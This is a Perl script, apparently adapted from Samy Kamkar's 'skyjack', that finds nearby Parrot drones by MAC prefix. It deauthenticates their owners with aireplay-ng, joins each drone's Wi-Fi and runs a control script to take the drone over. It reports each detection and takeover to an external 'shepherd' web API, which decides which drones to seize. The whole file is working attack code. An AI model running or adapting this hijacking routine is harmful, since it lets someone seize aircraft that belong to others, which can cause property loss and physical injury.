#!/usr/bin/perl

# skyjack, by samy kamkar

# this software detects flying drones, deauthenticates the
# owner of the targetted drone, then takes control of the drone

# by samy kamkar, code@samy.pl
# http://samy.pl
# dec 2, 2013


# mac addresses of ANY type of drone we want to attack
# Parrot owns the 90:03:B7 block of MACs and a few others
# see here: http://standards.ieee.org/develop/regauth/oui/oui.txt
my @drone_macs = qw/90:03:B7 A0:14:3D 00:12:1C 00:26:7E/;
# use strict;
use warnings;
use REST::Client;
use JSON;

### Setup for API calls ###

# Ground Station Identifier
# my $gs_id = $ENV{"GROUND_STATION_ENV_VARIABLE"}; 
my $gs_id = '1';
my $client = REST::Client->new();

my $headers = { Accept => 'application/vnd.shepherd_app.com+json; version=1' }; #headers hash for GET
# This works for post
$client->addHeader('Content-Type', 'application/json');
$client->addHeader('charset', 'UTF-8');
$client->addHeader('Accept', 'application/vnd.shepherd_app.com+json; version=1');

my $shepherd_app_url = 'http://theshepherd.herokuapp.com/api/';
my $logs_path = 'ground_stations/' . $gs_id . '/logs';
my $drones_path = 'drones/take_control?drone_mac_address=';

### API setup done ###


my $interface  = shift || "wlan1";
my $interface2 = shift || "wlan0";

# the JS to control our drone
my $controljs  = shift || "lib/index.js";

# paths to applications
my $dhclient	= "dhclient";
my $iwconfig	= "iwconfig";
my $ifconfig	= "ifconfig";
my $airmon	= "airmon-ng";
my $aireplay	= "aireplay-ng";
my $aircrack	= "aircrack-ng";
my $airodump	= "airodump-ng";
my $nodejs	= "node";


# put device into monitor mode
sudo($ifconfig, $interface, "down");
#sudo($airmon, "start", $interface);

# tmpfile for ap output
my $tmpfile = "/tmp/dronestrike";
my %skyjacked;

### GROUND STATION STARTED LOG ###
my $data = '{"event":"ground_station_started"}';
$client->POST($shepherd_app_url . $logs_path, $data);

while (1)
{

		# show user APs
		eval {
			local $SIG{INT} = sub { die };
			my $pid = open(DUMP, "|sudo $airodump --output-format csv -w $tmpfile $interface >>/dev/null 2>>/dev/null") || die "Can't run airodump ($airodump): $!";
			print "pid $pid\n";

			# wait 5 seconds then kill
			sleep 10;
			print DUMP "\cC";
			sleep 1;
			sudo("kill", $pid);
			sleep 1;
			sudo("kill", "-HUP", $pid);
			sleep 1;
			sudo("kill", "-9", $pid);
			sleep 1;
			sudo("killall", "-9", $aireplay, $airodump);
			#kill(9, $pid);
			close(DUMP);
		};

		sleep 4;
		# read in APs
		my %clients;
		my %chans;
		foreach my $tmpfile1 (glob("$tmpfile*.csv"))
		{
				open(APS, "<$tmpfile1") || print "Can't read tmp file $tmpfile1: $!";
				while (<APS>)
				{
					# strip weird chars
					s/[\0\r]//g;

					foreach my $dev (@drone_macs)
					{
						# determine the channel
						if (/^($dev:[\w:]+),\s+\S+\s+\S+\s+\S+\s+\S+\s+(\d+),.*(ardrone\S+),/)
						{
							print "CHANNEL $1 $2 $3\n";
							$chans{$1} = [$2, $3];

							### DRONE DETECTED LOG ###
							my $data = '{"event":"detected", "drone_mac_address":"'. $1 .'"}';
							$client->POST($shepherd_app_url . $logs_path, $data);
						}

						# grab our drone MAC and owner MAC
						if (/^([\w:]+).*\s($dev:[\w:]+),/)
						{
							print "CLIENT $1 $2\n";
							$clients{$1} = $2;
						}
					}
				}
				close(APS);
				sudo("rm", $tmpfile1);
				#unlink($tmpfile1);
		}
		print "\n\n";

		my $cli_size = keys %clients;
		my $drone_and_client = 0;
		my $drone_with_client_mac = "";
		my $dcPid = fork();
		

		if ($cli_size > 0){
			foreach my $cli (keys %clients){	
				print "Found client ($cli) connected to $chans{$clients{$cli}}[1] ($clients{$cli}, channel $chans{$clients{$cli}}[0])\n";

				# Check if the client found belongs to a drone that must be hacked
				print "Check if we should hack $clients{$cli}\n";
				$client->GET($shepherd_app_url . $drones_path . $clients{$cli}, $headers);
				my $json_res = from_json($client->responseContent());
				print "Take control? " . $json_res->{'take_control'} . "\n";

				if ($json_res->{'take_control'} eq '1'){
					# hop onto the channel of the ap
					print "Jumping onto drone's channel $chans{$clients{$cli}}[0]\n\n";
					#sudo($airmon, "start", $interface, $chans{$clients{$cli}}[0]);
					sudo($iwconfig, $interface, "channel", $chans{$clients{$cli}}[0]);

					sleep(1);

					# now, disconnect the TRUE owner of the drone.
					# sucker.
					print "Disconnecting the true owner of the drone \n\n";
					
					if ($dcPid == 0) {
						sudo($aireplay, "-0", "0", "-a", $clients{$cli}, "-c", $cli, $interface);
					}

					#sudo($aireplay, "-0", "3", "-a", $clients{$cli}, "-c", $cli, $interface);
					print "Aireplay launched\n";
					#sudo($aireplay, "-0", "3", "-a", $clients{$cli}, $interface);

					$drone_and_client = 1;
					$drone_with_client_mac = $clients{$cli};
					last;
				}

				next;
			}
		}	

		# sleep(2);

		if($drone_and_client){
				print "\n\nConnecting to drone $chans{$drone_with_client_mac}[1] ($drone_with_client_mac)\n";
				sudo($iwconfig, $interface2, "essid", $chans{$drone_with_client_mac}[1]);
				#sudo($iwconfig, $interface2, "key", "open", "mode", "Managed", "essid", $chans{$drone}[1], "channel", $chans{$drone}[0]);
				
				#print "Acquiring IP from drone for hostile takeover\n";
				sudo($dhclient, $interface2);

				sleep 1;
                                sudo("kill", "-9", $dcPid);
				sleep 1;
				waitpid($dcPid, 0);
				sleep 1;
				sudo("killall", "-9", $aireplay);
				#kill(SIGTERM, $dcPid);

				### TAKING_CONTROL LOG ###
				my $data = '{"event":"taking_control", "drone_mac_address":"'. $drone_with_client_mac .'"}';
				$client->POST($shepherd_app_url . $logs_path, $data);

				print "\n\nTAKING OVER DRONE\n";
				sudo($nodejs, $controljs);

				### DONE LOG ###
				my $data = '{"event":"controlled", "drone_mac_address":"'. $drone_with_client_mac .'"}';
				$client->POST($shepherd_app_url . $logs_path, $data);

				#sleep 1;
                        	#sudo("kill", "-9", $aireplay);
				sleep 2;
		}

		# connect to each drone and run our zombie client!
		# foreach my $drone (keys %chans)
		# {

		# 	$client->GET($shepherd_app_url . $drones_path . $drone, $headers);
		# 	my $json_res = from_json($client->responseContent());

		# 	print $json_res->{'take_control'};
		# 	print !($json_res->{'take_control'});

		# 	#print "\n\nConnecting to drone $chans{$drone}[1] ($drone)\n";
		# 	sudo($iwconfig, $interface2, "essid", $chans{$drone}[1]);
		# 	#sudo($iwconfig, $interface2, "key", "open", "mode", "Managed", "essid", $chans{$drone}[1], "channel", $chans{$drone}[0]);
			
		# 	#print "Acquiring IP from drone for hostile takeover\n";
		# 	sudo($dhclient, $interface2);

		# 	### TAKING_CONTROL LOG ###
		# 	my $data = '{"event":"taking_control", "drone_mac_address":"'. $drone .'"}';
		# 	$client->POST($shepherd_app_url . $logs_path, $data);

		# 	print "\n\nTAKING OVER DRONE\n";
		# 	sudo($nodejs, $controljs);

		# 	### DONE LOG ###
		# 	my $data = '{"event":"controlled", "drone_mac_address":"'. $drone .'"}';
		# 	$client->POST($shepherd_app_url . $logs_path, $data);
				
		# }
}

	
sub sudo
{
	print "Running: @_\n";
	system("sudo", @_);
}
